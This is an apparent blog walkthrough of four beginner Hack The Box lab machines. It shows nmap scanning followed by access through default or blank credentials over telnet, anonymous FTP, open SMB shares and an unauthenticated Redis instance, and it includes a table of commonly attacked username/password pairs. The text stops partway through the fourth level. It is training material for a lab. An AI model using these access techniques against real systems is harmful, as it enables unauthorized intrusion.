Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world to level up their hacking skills.

In this blog, I will perform an analysis of each level and give a walkthrough for the methodology I took to find the flag.

## Table of Contents

### Tier 0

 1. ✓ [Level 1: Meow](#level-1-meow) 
 2. ✓ [Level 2: Fawn](#level-2-fawn) 
 3. ✓ [Level 3: Dancing](#level-3-dancing) 
 4. ✓ [Level 4: Redeemer](#level-4-redeemer) 
 5. ✓ [Level 5: Explosion](#level-5-explosion) 
 6. ✓ [Level 6: Preignition](#level-6-preignition) 

### Tier 1

 1. ✓ [Level 1: Appointment](#level-1-appointment) 
 2. ✓ [Level 2: Sequel](#level-2-sequel) 
 3. ✓ [Level 3: Crocodile](#level-3-crocodile)
 4. ✓ [Level 4: Responder](#level-4-responder) 
 5. ✓ [Level 5: Ignition](#level-5-ignition) 
 6. ✓ [Level 6: Bike](#level-6-bike) 
 7. ✓ [Level 7: Pennyworth](#level-7-pennyworth) 
 8. ✓ [Level 8: Tactics](#level-8-tactics) 


### Tier 2

 1. ✓ [Level 1: Archtype](#level-1-archtype) 
 2. ✓ [Level 2: Oopsie](#level-2-oopsie) 
 3. ✗ [Level 3: Vaccine](#level-3-vaccine)
 4. ✗ [Level 4: Unified](#level-4-unified) 
 5. ✗ [Level 5: Included](#level-5-included) 
 6. ✗ [Level 6: Markup](#level-6-markup) 
 7. ✗ [Level 7: Base](#level-7-base) 

### Beginner Track

 1. ✗ [Level 1: Lame](#level-1-lame) 
 2. ✗ [Level 2: Find The Easy Pass](#level-2-find-the-easy-pass) 
 3. ✗ [Level 3: Weak RSA](#level-3-weak-rsa)
 4. ✗ [Level 4: Jerry](#level-4-jerry) 
 5. ✗ [Level 5: You Know 0xDiablos](#level-5-you-know-0xdiablos) 
 6. ✗ [Level 6: Netmon](#level-6-netmon) 
 7. ✗ [Level 7: Under Construction](#level-6-under-construction) 
 8. ✗ [Level 8: Blue](#level-6-blue) 

# Tier 0

## Level 1: Meow

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.1.17   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.1.17

PING 10.129.1.17 (10.129.1.17) 56(84) bytes of data.
64 bytes from 10.129.1.17: icmp_seq=1 ttl=63 time=9.08 ms
64 bytes from 10.129.1.17: icmp_seq=2 ttl=63 time=7.17 ms
64 bytes from 10.129.1.17: icmp_seq=3 ttl=63 time=6.02 ms
64 bytes from 10.129.1.17: icmp_seq=4 ttl=63 time=12.0 ms
--- 10.129.1.17 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 6.021/8.572/12.024/2.272 ms
```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
nmap -p- --min-rate 3000 -sC -sV 10.129.1.17
  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 10:04 EDT
Nmap scan report for 10.129.1.17
Host is up (0.0084s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds
```
Our scan shows some interesting results. Port 23 is open, and reserved for the service telnet. Telnet is an insecure, outdated protocol that should not be used. A quote from [wikipedia](https://en.wikipedia.org/wiki/Telnet):


> Telnet, by default, does not encrypt any data sent over the connection (including passwords), and so it is often feasible to eavesdrop on the communications and use the password later for malicious purposes; anybody who has access to a router, switch, hub or gateway located on the network between the two hosts where Telnet is being used can intercept the packets passing by and obtain login, password and whatever else is typed with a packet analyzer. 

> Most implementations of Telnet have no authentication that would ensure communication is carried out between the two desired hosts and not intercepted in the middle. 

> Several vulnerabilities have been discovered over the years in commonly used Telnet daemons. 


Thus, we can use this to our advantage to exploit this machine. 

We can start by trying to connect to the server using the telnet service.

```
telnet {ip address}
```
 
The results of using telnet are:

```
└─$ telnet 10.129.1.17

Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

Now we can try to use some commonly used credentials that may have been set up insecurely by an administrator who set up and configured the service. 
According to [threat intelligence reports](https://www.f5.com/labs/articles/threat-intelligence/spaceballs-security--the-top-attacked-usernames-and-passwords)

![Figure1_min](https://user-images.githubusercontent.com/59018247/179361794-36c3a464-db56-4e23-b48b-6b37ecc8b052.png)

The 5 most common user names and passwords attacked are as follows: 

| # | 	Username 	| Password |
| :-----------: | :-----------: | :-----------: |
| 1 | 	root   |    	admin   | 
| 2 | 	admin  |    	admin   | 
| 3 | 	user 	 |  user       | 
| 4 | 	test 	 |  test       | 
| 5 | 	ubuntu |  	ubuntu    | 

We can start by using these credentials to start with.

The result when attempting to use the user name ```admin```:

```
Meow login: admin

Password: 

Login incorrect
```
The result when attempting to use the user name ```root```:

```
Meow login: root

Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 16 Jul 2022 02:20:12 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             139
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.17
  IPv6 address for eth0: dead:beef::250:56ff:feb9:e2d7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```
We can see here by using the username root, we were able to get root access to the system. 

Once infiltrated, we can now scan the directory for any important files.

```
root@Meow:~# ls

flag.txt  snap 
```

As we can see, we found our first flag in the main directory.

## Conclusions - Level 1 Meow

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
| 2 | 	Telnet Service  |    	X |  |  |  |


Using nmap, we were able to discover the host was running telnet on port 23. Logging into telnet we were then able to get root access to the service, a consequence of the server administrator having poorly configured the credentials of the system.


[Table of Contents](#table-of-contents) 


## Level 2: Fawn

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.28.125   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.28.125

PING 10.129.28.125 (10.129.28.125) 56(84) bytes of data.
64 bytes from 10.129.28.125: icmp_seq=1 ttl=63 time=5.74 ms
64 bytes from 10.129.28.125: icmp_seq=2 ttl=63 time=6.13 ms
64 bytes from 10.129.28.125: icmp_seq=3 ttl=63 time=6.26 ms
64 bytes from 10.129.28.125: icmp_seq=4 ttl=63 time=11.6 ms

--- 10.129.28.125 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 5.736/7.428/11.586/2.408 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.28.125 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-17 18:43 EDT
Nmap scan report for 10.129.28.125
Host is up (0.0063s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.93 seconds

```
Our scan shows one potential attack vector on port 21, reserved for the FTP protocol. According to digital guardian [Digital Guardian](https://digitalguardian.com/blog/what-ftp-security-securing-ftp-usage):

> FTP was not built to be secure. It is generally considered to be an insecure protocol because it relies on clear-text usernames and passwords for authentication and does not use encryption. Data sent via FTP is vulnerable to sniffing, spoofing, and brute force attacks, among other basic attack methods.

> There are several common approaches to addressing these challenges and securing FTP usage. FTPS is an extension of FTP that can encrypt connections at the client’s request. Transport Layer Security (TLS), Secure Socket Layer (SSL), and SSH File Transfer Protocol (also known as Secure File Transfer Protocol or SFTP) are often used as more secure alternatives to FTP because they use encrypted connections.
 
 ![ftp-diagram](https://user-images.githubusercontent.com/59018247/179428018-a6de38c5-9980-4c13-883f-1936c6d82ff3.gif)

Thus, we can try to log into this service to gain access to the system.

We can start by trying to establish connection to the ftp server:

```
ftp {ip address}
```
 
The results of using ftp are:

```
└─$ ftp 10.129.28.125   

Connected to 10.129.28.125.
220 (vsFTPd 3.0.3)

Name (10.129.28.125:kali): 
```
We are now being prompted for a username credential.

According to [microsoft](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/ftpserver/security/authentication/anonymousauthentication), a common default username credential for the ftp services is ```anonymous```, which can be used with any password.
 
The result when attempting to use the user name ```anonymous```:

```
Name (10.129.28.125:kali): anonymous

331 Please specify the password.
Password: 

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> 

```
We can see here by using the username anonymous, we were able to access the ftp server. 

Once infiltrated, we can now scan the directory for any important files.

```
ftp> dir

229 Entering Extended Passive Mode (|||13396|)
150 Here comes the directory listing.

-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt

226 Directory send OK.

```
As we can see, we found our second flag in the ftp directory. 

We can now download the flag onto our system using the ```get``` command:

```
ftp> get flag.txt

local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||32236|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |**************************************************|    32       39.01 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (3.39 KiB/s)
```

## Conclusions - Level 2 Fawn

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
| 2 | 	FTP Service  |    	X |  |  |  |


Using nmap, we were able to discover the host was running an FTP service port 21. Logging into FTP server we were then able to get access to the service, a consequence of the server administrator having poorly configured the login credentials of the system.


[Table of Contents](#table-of-contents) 




## Level 3: Dancing

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.250.96   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.250.96

PING 10.129.250.96 (10.129.250.96) 56(84) bytes of data.
64 bytes from 10.129.250.96: icmp_seq=1 ttl=127 time=9.95 ms
64 bytes from 10.129.250.96: icmp_seq=2 ttl=127 time=8.91 ms
64 bytes from 10.129.250.96: icmp_seq=3 ttl=127 time=8.10 ms
64 bytes from 10.129.250.96: icmp_seq=4 ttl=127 time=7.16 ms

--- 10.129.250.96 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 7.164/8.531/9.950/1.026 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.250.96

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 14:53 EDT
Nmap scan report for 10.129.250.96
Host is up (0.0068s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-18T22:54:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.18 seconds


```
Our scan shows quite a few ports the can be explored. One of the more interesting ones is port ```445```, which is reserved for Sever Message Block (SMB). According to [cybersophia](https://cybersophia.net/articles/what-is/what-is-smb-protocol-and-why-is-it-a-security-concern/):

> To begin with the communication model, SMB works in a client–server architecture. In this model, SMB servers provide network resources, such as files or printers to the other computers, known as clients. Through this feature, users on different remote devices can collaborate on shared files and print their documents on shared printers over a network.

> In addition to this primary functionality of shared files and printers on serves, SMB also provides an authenticated inter-process communication (IPC) among processes running on remote computers. For this purpose, a network share, known as IPC share (ipc$), is used on Windows computers to facilitate communication between processes and remote computers.

> Especially due to its a wide array of features and complex implementation (which is contrary to the “Economy of Mechanism” principle), quite a number of SMB related vulnerabilities were discovered over the years and some of these vulnerabilities caused serious security issues around the world.

> The most infamous of these vulnerabilities were 5 Remote Code Execution (RCE) vulnerabilities (CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0148) that affected Windows computers running SMBv1. Microsoft subsequently released a patch MS17-010) on March 14, 2017, however, experts advised users and administrators to take the additional step of disabling SMBv1 on all systems.

![SMB](https://user-images.githubusercontent.com/59018247/179587599-3bc9dc29-dbee-4db4-9615-0a19c4fa8397.jpg)

We can start by trying to establish connection using smbclient:

```
smbclient -L {ip address}
```
 
The results of using smbclient are:

```
└─$ smbclient -L 10.129.250.96

Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.250.96 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
We can see here all of the visible share names listed. A great starting point is to try to connect with each of these shares.

Starting with ```ADMIN$```:

```
└─$ smbclient \\\\10.129.250.96\\ADMIN$

Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED

```
We get an  invalid password failure response.

Trying the remaining shares:

```
└─$ smbclient \\\\10.129.250.96\\C$    

Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED

```

```
└─$ smbclient \\\\10.129.250.96\\IPC$

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
```
We get out first hit using IPC$. 

Scanning the directory, there are no files to be shown:

```
smb: \> ls

NT_STATUS_NO_SUCH_FILE listing \*
```
This makes sense, since IPC$ is not part of the file system. It is the inter-process communication share.

We can try reconnecting using the last credential, ```WorkShares```:

```
└─$ smbclient \\\\10.129.250.96\\WorkShares

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
```
Again we get another hit, so we can try to browse the local directory.

```
└─$ smbclient \\\\10.129.250.96\\WorkShares

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1747619 blocks available
smb: \> 
```

Now we can see two new directories that we can browse, Amy.J and James.P:

```
smb: \> cd Amy.J

smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

                5114111 blocks of size 4096. 1747619 blocks available

smb: \Amy.J\> ..

smb: \> cd James.P

smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1747611 blocks available
smb: \James.P\> 
```
As we can see, we revealed our third flag inside the James.P directory.

```
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```
## Conclusions - Level 3 Dancing

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the service, a consequence of the server administrator having poorly configured the login credentials for ```WorkShare```.


[Table of Contents](#table-of-contents) 



## Level 4: Redeemer

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.26.199  | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.26.199

PING 10.129.26.199 (10.129.26.199) 56(84) bytes of data.
64 bytes from 10.129.26.199: icmp_seq=1 ttl=63 time=12.8 ms
64 bytes from 10.129.26.199: icmp_seq=2 ttl=63 time=12.5 ms
64 bytes from 10.129.26.199: icmp_seq=3 ttl=63 time=8.61 ms
64 bytes from 10.129.26.199: icmp_seq=4 ttl=63 time=7.19 ms

--- 10.129.26.199 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 7.186/10.281/12.847/2.439 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.26.199

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 20:11 EDT
Nmap scan report for 10.129.26.199
Host is up (0.013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds

```
Our scan shows only one potential port to explore, tcp port 6379. This port is being used for an in memory database called Redis. According to [Redis Docs](https://docs.redis.com/latest/rs/technology-behind-redis-enterprise/):

> A Redis Enterprise Cluster hosts one or more Redis databases. Access to these databases runs through a multi-threaded proxy that lives on each cluster node. These proxies efficiently and transparently route queries to the appropriate underlying Redis instance.

> The cluster manager consists of a number of software components that monitor and configure the many Redis instances that make up a cluster.

> Redis Enterprise simplifies and automates many tasks including provisioning new databases, updating database configuration, resharding existing databases, and rebalancing shards across cluster nodes.

![redis](https://user-images.githubusercontent.com/59018247/179869671-c20ab11b-e406-4230-b2f0-053b6908afd9.png)

According to the documentation, by default Redis is located on port 6379 with no password!

Since Redis is a remote database that stores key-value pairs, we can first try to interact with it using the redis command line interface (CLI):

```
└─$ redis-cli --help
redis-cli 6.0.16

Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -s <socket>        Server socket (overrides hostname and port).
  -a <password>      Password to use when connecting to the server.
                     You can also use the REDISCLI_AUTH environment
                     variable to pass this password more safely
                     (if both are used, this argument takes precedence).
  --user <username>  Used to send ACL style 'AUTH username pass'. Needs -a.
  --pass <password>  Alias of -a for consistency with the new --user option.
  --askpass          Force user to input password with mask from STDIN.
                     If this argument is used, '-a' and REDISCLI_AUTH
                     environment variable will be ignored.
  -u <uri>           Server URI.
  -r <repeat>        Execute specified command N times.
  -i <interval>      When -r is used, waits <interval> seconds per command.
                     It is possible to specify sub-second times like -i 0.1.
  -n <db>            Database number.
  -3                 Start session in RESP3 protocol mode.
  -x                 Read last argument from STDIN.
  -d <delimiter>     Delimiter between response bulks for raw formatting (default: \n).
  -D <delimiter>     Delimiter between responses for raw formatting (default: \n).
  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
  --tls              Establish a secure TLS connection.
  --sni <host>       Server name indication for TLS.
  --cacert <file>    CA Certificate file to verify with.
  --cacertdir <dir>  Directory where trusted CA certificates are stored.
                     If neither cacert nor cacertdir are specified, the default
                     system-wide trusted root certs configuration will apply.
  --cert <file>      Client certificate to authenticate with.
  --key <file>       Private key file to authenticate with.
  --raw              Use raw formatting for replies (default when STDOUT is
                     not a tty).
  --no-raw           Force formatted output even when STDOUT is not a tty.
  --csv              Output in CSV format.
  --stat             Print rolling stats about server: mem, clients, ...
  --latency          Enter a special mode continuously sampling latency.
                     If you use this mode in an interactive session it runs
                     forever displaying real-time stats. Otherwise if --raw or
                     --csv is specified, or if you redirect the output to a non
                     TTY, it samples the latency for 1 second (you can use
                     -i to change the interval), then produces a single output
                     and exits.
  --latency-history  Like --latency but tracking latency changes over time.
                     Default time interval is 15 sec. Change it using -i.
  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.
                     Default time interval is 1 sec. Change it using -i.
  --lru-test <keys>  Simulate a cache workload with an 80-20 distribution.
  --replica          Simulate a replica showing commands received from the master.
  --rdb <filename>   Transfer an RDB dump from remote server to local file.
  --pipe             Transfer raw Redis protocol from stdin to server.
  --pipe-timeout <n> In --pipe mode, abort with error if after sending all data.
                     no reply is received within <n> seconds.
                     Default timeout: 30. Use 0 to wait forever.
  --bigkeys          Sample Redis keys looking for keys with many elements (complexity).
  --memkeys          Sample Redis keys looking for keys consuming a lot of memory.
  --memkeys-samples <n> Sample Redis keys looking for keys consuming a lot of memory.
                     And define number of key elements to sample
  --hotkeys          Sample Redis keys looking for hot keys.
                     only works when maxmemory-policy is *lfu.
  --scan             List all keys using the SCAN command.
  --pattern <pat>    Keys pattern when using the --scan, --bigkeys or --hotkeys
                     options (default: *).
  --intrinsic-latency <sec> Run a test to measure intrinsic system latency.
                     The test will run for the specified amount of seconds.
  --eval <file>      Send an EVAL command using the Lua script at <file>.
  --ldb              Used with --eval enable the Redis Lua debugger.
  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in
                     this mode the server is blocked and script changes are
                     not rolled back from the server memory.
  --cluster <command> [args...] [opts...]
                     Cluster Manager command and arguments (see below).
  --verbose          Verbose mode.
  --no-auth-warning  Don't show warning message when using password on command
                     line interface.
  --help             Output this help and exit.
  --version          Output version and exit.

Cluster Manager Commands:
  Use --cluster help to list all available cluster manager commands.

Examples:
  cat /etc/passwd | redis-cli -x set mypasswd
  redis-cli get mypasswd
  redis-cli -r 100 lpush mylist x
  redis-cli -r 100 -i 1 info | grep used_memory_human:
  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3
  redis-cli --scan --pattern '*:12345*'

  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)

When no command is given, redis-cli starts in interactive mode.
Type "help" in interactive mode for information on available commands
and settings.

```
 
We can try connecting to the remote database first:

```
└─$ redis-cli -h 10.129.26.199

10.129.26.199:6379> 

```
Since we eatablished a connection, we can find more information about it using ```info```:

```
10.129.26.199:6379> info

# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:751
run_id:b013d951cdd2dc519ba118efe21939f1cb5cce84
tcp_port:6379
uptime_in_seconds:1272
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:14109730
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:6029312
used_memory_rss_human:5.75M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1592408
allocator_active:1937408
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.22
allocator_frag_bytes:345000
allocator_rss_ratio:4.73
allocator_rss_bytes:7221248
rss_overhead_ratio:0.66
rss_overhead_bytes:-3129344
mem_fragmentation_ratio:7.37
mem_fragmentation_bytes:5211696
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1658276527
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:409600
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:7
total_commands_processed:6
instantaneous_ops_per_sec:0
total_net_input_bytes:318
total_net_output_bytes:14889
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:380
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:dd4ac0c6f4bd6da4c7276c4bbd2e7df99b3fcedc
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:1.260113
used_cpu_user:1.267941
used_cpu_sys_children:0.000000
used_cpu_user_children:0.003331

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0


```
We can see on the end line that there is 1 database at index 0 with 4 total keys.

In order to explore the database, we can try using the ```select``` command: 

```
10.129.26.199:6379> select 0

OK
```
Now we can try accessing all the associated keys:

```
10.129.26.199:6379> keys *

1) "numb"
2) "flag"
3) "stor"
4) "temp"

```
Our fourth flag shows up under key 2. We can extract it using the ```get``` command:

```
10.129.26.199:6379> get flag

```

## Conclusions - Level 4 Redeemer

